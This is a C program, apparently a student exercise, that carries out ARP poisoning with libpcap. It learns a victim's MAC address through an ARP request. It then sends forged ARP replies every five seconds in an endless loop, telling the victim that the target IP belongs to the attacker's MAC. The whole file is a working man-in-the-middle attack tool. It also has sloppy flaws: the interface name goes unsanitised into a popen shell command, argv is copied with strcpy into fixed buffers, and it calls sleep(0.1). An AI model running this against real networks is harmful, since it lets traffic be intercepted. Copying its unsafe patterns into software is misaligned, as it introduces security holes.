#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ether.h>
#include <net/ethernet.h>  
#include <arpa/inet.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <netinet/if_ether.h>
#include <time.h>

#define MAC_SIZE 20
#define IP_SIZE  20

char my_mac[MAC_SIZE];
char my_ip[IP_SIZE];
char victim_mac[MAC_SIZE];	// sender mac
char victim_ip[IP_SIZE];	// sender ip
char target_ip[IP_SIZE];

struct ether_addr my_mac_bin;
struct ether_addr victim_mac_bin;
struct in_addr my_ip_bin;

void find_my_mac(char *); 
void find_victim_mac(pcap_t *);
void arp_poisoning(pcap_t *);

int main(int argc, char **argv) {

	if (argc != 4  ) {
		printf("usuage : %s [interface name] <sender_ip> <target_ip> \n", argv[0]);
		return 0;
	}

	char dev[20];
	strcpy(dev, argv[1]);
	strcpy(victim_ip, argv[2]);
	strcpy(target_ip, argv[3]);

	// find my mac
	find_my_mac(argv[1]);

	// open pcap live
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1; 
	}   

	// find victim's mac
	find_victim_mac(handle);

	// sender ip arp poisoning
	arp_poisoning(handle);

}


void find_my_mac(char *dev_name) {

	FILE *ptr;
	char MAC[MAC_SIZE];
	char IP[IP_SIZE]={0,};
	char cmd[300]={0,};
	char FILTER_RULE[20] = "ether dst ";

	// find my mac addr by parsing ifconfig
	sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'", dev_name);

	ptr = popen(cmd, "r");
	fgets(MAC, sizeof(MAC), ptr);
	pclose(ptr);
	if (MAC != NULL) {
		ether_aton_r(MAC, &my_mac_bin);
		strcat(FILTER_RULE, MAC);
		strcpy(my_mac, MAC);
		printf("[*] my mac addr : %s\n", my_mac);
	}

	// find my ip addr by parsing ifconfig
	sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'", dev_name);
	ptr = popen(cmd, "r");
	fgets(IP, sizeof(IP), ptr);
	pclose(ptr);
	if(IP != NULL) {
		inet_aton(IP+5, &my_ip_bin);
		strcpy(my_ip, IP+5);
		printf("[*] my ip addr : %s\n", my_ip);
	}
}

void find_victim_mac(pcap_t * handle) {

	unsigned char packet[1000];
	memset(packet, 0, sizeof(packet));

	// broad cast... for finding victim mac
	// make eth header
	struct ethhdr eth_header;
	memset(eth_header.h_dest, 0xff, 6);	 // for broad casting
	memcpy(eth_header.h_source, &my_mac_bin, 6);	// source mac == my mac
	eth_header.h_proto = htons(ETHERTYPE_ARP);	// ether type == 0x0806

	// make arp header
	struct ether_arp arp_header;
	arp_header.ea_hdr.ar_hrd = htons(1); 	// hardware type
	arp_header.ea_hdr.ar_pro = htons(ETHERTYPE_IP); 	// ethertype ip
	arp_header.ea_hdr.ar_hln = 6; 	// hardware len
	arp_header.ea_hdr.ar_pln = 4; 	// protocol len
	arp_header.ea_hdr.ar_op = htons(1); 	// opcode 1 (request)

	memcpy(arp_header.arp_sha, &my_mac_bin, 6);	// source mac (my mac)
	inet_pton(AF_INET, my_ip, &arp_header.arp_spa);	// source ip (my ip)

	memset(arp_header.arp_tha, 0x00, 6);	// destination mac
	inet_pton(AF_INET, victim_ip, &arp_header.arp_tpa);	// destination ip (victim ip)

	memcpy(packet, &eth_header, 14); // ethernet header
	memcpy(packet+14, &arp_header, 28); // arp header


	// send packet
	while(1) {

		// send arp packet
		if (pcap_sendpacket(handle, packet, 42) != 0) { 
			printf("[*] error sending packet....\n");
			exit(0);
		}
		// get packet
		int cnt = 5;
		while (cnt--) {
			
			printf("enumerating victim mac...\n");
			struct pcap_pkthdr* header;
			const u_char* recv_packet;
			int res = pcap_next_ex(handle, &header, &recv_packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;

			struct ether_header *eh = (struct ether_header *)recv_packet;
			uint16_t ether_type = ntohs(eh->ether_type);

			struct ether_arp *arp_header = (struct ether_arp *)(recv_packet + 14);
			uint16_t opcode = ntohs(arp_header->ea_hdr.ar_op);
			// printf("opcode : %u\n", opcode);

			// check if opcode is 0x02 (arp reply)
			if (ether_type == ETHERTYPE_ARP && opcode == 0x02) {

				struct ether_addr dest_mac_bin;
				memcpy(&dest_mac_bin, eh->ether_dhost, sizeof(struct ether_addr));

				// printf("%x\n", my_mac_bin);
				// printf("%x\n", dest_mac_bin);

				if( !memcmp(&my_mac_bin, &dest_mac_bin, sizeof(struct ether_addr) )) {

					char dest_mac[MAC_SIZE];	// my mac
					sprintf(dest_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
							eh->ether_dhost[0],
							eh->ether_dhost[1],
							eh->ether_dhost[2],
							eh->ether_dhost[3],
							eh->ether_dhost[4],
							eh->ether_dhost[5]);

					char source_mac[MAC_SIZE]; // victim mac
					sprintf(source_mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
							eh->ether_shost[0],
							eh->ether_shost[1],
							eh->ether_shost[2],
							eh->ether_shost[3],
							eh->ether_shost[4],
							eh->ether_shost[5]);

					//printf("source mac : %s\n", source_mac);
					//printf("dest mac : %s\n", dest_mac);

					strcpy(victim_mac, ether_ntoa((const struct ether_addr *)eh->ether_shost));
					printf("[*] victim mac : %s\n", source_mac);
					ether_aton_r(source_mac, &victim_mac_bin);
					// memcpy(&victim_mac_bin, eh->ether_shost, 6);
					//printf("debug : %x %x %x %x\n", victim_mac_bi;
					return;
				} // if memcpy

				sleep(0.1);

			} // end if
		} // end while

	} // end while

}

void arp_poisoning(pcap_t * handle) {

	unsigned char packet[1000];
	memset(packet, 0, sizeof(packet));

	// attack to victim(sender) target mac is my mac
	// make eth header
	struct ethhdr eth_header;
	memcpy(eth_header.h_dest, &victim_mac_bin, 6);	 // victim mac (sender mac)
	memcpy(eth_header.h_source, &my_mac_bin, 6);	// source mac == my mac
	eth_header.h_proto = htons(ETHERTYPE_ARP);	// ether type == 0x0806

	// make arp header
	// arp spoofing
	struct ether_arp arp_header;
	arp_header.ea_hdr.ar_hrd = htons(1); 	// hardware type
	arp_header.ea_hdr.ar_pro = htons(ETHERTYPE_IP); 	// ethertype ip
	arp_header.ea_hdr.ar_hln = 6; 	// hardware len
	arp_header.ea_hdr.ar_pln = 4; 	// protocol len
	arp_header.ea_hdr.ar_op = htons(2); 	// opcode 2 (reply)

	memcpy(arp_header.arp_sha, &my_mac_bin, 6);	// source mac (my mac)
	inet_pton(AF_INET, target_ip, &arp_header.arp_spa);	// source ip (target ip) (argv[3])

	memcpy(arp_header.arp_tha, &victim_mac_bin, 6);	// destination mac
	inet_pton(AF_INET, victim_ip, &arp_header.arp_tpa);	// destination ip (victim ip)

	memcpy(packet, &eth_header, 14); // ethernet header
	memcpy(packet+14, &arp_header, 28); // arp header

	// send arp packet
	// arp poisoning

	int cnt = 1;
	while(1) {
		printf("arp poisoning...\n");
		if (pcap_sendpacket(handle, packet, 42) != 0) { 
			printf("[*] error sending packet....\n");
			exit(0);
		}
		sleep(5);
	}

}
